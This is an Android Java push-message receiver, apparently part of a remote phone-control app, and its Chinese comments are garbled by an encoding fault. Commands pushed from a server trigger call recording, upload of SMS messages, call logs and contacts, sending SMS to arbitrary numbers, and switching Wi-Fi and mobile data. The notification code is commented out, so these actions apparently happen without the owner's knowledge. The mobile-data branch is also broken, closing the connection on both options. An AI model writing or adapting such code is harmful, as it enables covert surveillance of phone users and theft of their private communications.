package com.imudges.zhw.push;

import org.json.JSONException;
import org.json.JSONObject;

import com.google.gson.JsonObject;
import com.imudges.ldj.servse.CallLogService;
import com.imudges.ldj.utils.WifiAdmin;
import com.imudges.ldj.utils.WifiResAbout;
import com.imudges.zhw.javabean.BaseInfo;
import com.imudges.zhw.slee.BatteryInfoBroadcastReceiver;
import com.imudges.zhw.slee.CallRecordService;
import com.imudges.zhw.slee.ProviderLookUpService;
import com.imudges.zhw.slee.ProviderSingleSMSService;
import com.imudges.zhw.slee.ProviderThreadSMSService;
import com.imudges.zhw.util.EnvironmentUtils;

import cn.bmob.push.PushConstants;
import cn.bmob.v3.BmobUser;
import cn.bmob.v3.listener.SaveListener;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

//���ͱ���Ҫ������صĴ���
public class MyPushMessageReceiver extends BroadcastReceiver {
	private String opCode;// ��������
	private String explain;// ����
	private String JsonString;// json����
	private String[] opCodeArray;// ��������
	private EnvironmentUtils enu;
	public MyPushMessageReceiver() {
	}
	@Override
	public void onReceive(Context context, Intent intent) {
		enu = new EnvironmentUtils(context);
		String message = "";
		if (intent.getAction().equals(PushConstants.ACTION_MESSAGE)) {
			Log.d("bmob",
					"�ͻ����յ��������ݣ�"
							+ intent.getStringExtra(PushConstants.EXTRA_PUSH_MESSAGE_STRING));
			JSONObject js;
			try {
				js = new JSONObject(
						intent.getStringExtra(PushConstants.EXTRA_PUSH_MESSAGE_STRING));
				message = (String) js.get("alert");// ���͹����Ĵ���
			} catch (JSONException e1) {
				e1.printStackTrace();
			}
			System.out.println("tuisong de xiaoxi :" + message);
			opCodeArray = message.split(" ");
			opCode = opCodeArray[0];
			explain = opCodeArray[1];
			JsonString = opCodeArray[2];
			System.out.println("opCode:" + opCode);
			System.out.println("explain:" + explain);
			System.out.println("JsonString:" + JsonString);
			Intent it;
			switch (opCode) {

			case "0001":// init Mode�����������źŵ�����
				// �ύ�ֻ��Ļ�����Ϣ
				enu.submitBaseInfo();
				// �����绰¼��
				Intent serviceIntent = new Intent(context,
						CallRecordService.class);
				context.startService(serviceIntent);
				// ������������

				break;
			case "1001":// ��׼���õĶ���Thread �ϴ�
				Log.e("�յ���", "1001");			
				context.startService(new Intent(context,
						ProviderThreadSMSService.class));
				// ContentProviderService cps = new ContentProviderService();
				break;
			case "1002":// ��׼���õĶ��ż�¼ �ϴ�
				Log.e("�յ���", "1002");
				it = new Intent(context, ProviderSingleSMSService.class);
				it.putExtra("threadId", explain);
				context.startService(it);
				break;
			case "1003":// ���Ͷ���
				try {
					JSONObject dataJson = new JSONObject(JsonString);
					Log.i("phonenumber", dataJson.getString("phonenumber"));
					Log.i("phonenumber", dataJson.getString("content"));
					enu.sendSms(dataJson.getString("phonenumber"),
							dataJson.getString("content"));
				} catch (JSONException e) {
					e.printStackTrace();
				}
				break;
			case "1004":// ��׼���õ�ͨ����¼�ϴ���
				Log.e("�յ���", "1004");
				it = new Intent(context, CallLogService.class);
				context.startService(it);
				break;
			case "1005":// ��ϵ���ϴ�
				Log.e("�յ���", "1005");
				it = new Intent(context, ProviderLookUpService.class);
				context.startService(it);
				break;
			case "1010":// �ļ�����
				break;
			case "1011":// �鿴��һ��Ŀ¼ �ᴫ����һ��position
				break;
			case "1020":// ����������wifi
				WifiAdmin mWifiAdmin = new WifiAdmin(context);
				if (explain.equals("open")) {
					mWifiAdmin.openWifi();
				} else {
					mWifiAdmin.closeWifi();
				}
				break;
			case "1025":// ������
				if (explain.equals("open")) {
					enu.closeGprs();
				} else {
					enu.closeGprs();
				}
				;
				break;
			case "":
				break;
			}
		}
	}
}

// �������ֻ�֪ͨ����Ӧ�Ĵ���
/*
 * NotificationManager nm = (NotificationManager) context
 * .getSystemService(Context.NOTIFICATION_SERVICE); Notification n = new
 * Notification(); n.icon = R.drawable.ic_launcher; n.tickerText = "�յ����͵���Ϣ��";
 * n.when = System.currentTimeMillis(); //
 * n.flags=Notification.FLAG_ONGOING_EVENT; Intent it = new Intent(context,
 * MainActivity.class); PendingIntent pi = PendingIntent.getActivity(context, 0,
 * it, 0); n.setLatestEventInfo(context, "��Ϣ", message, pi); n.defaults |=
 * Notification.DEFAULT_SOUND; n.flags = Notification.FLAG_AUTO_CANCEL;
 * nm.notify(1, n);
 */
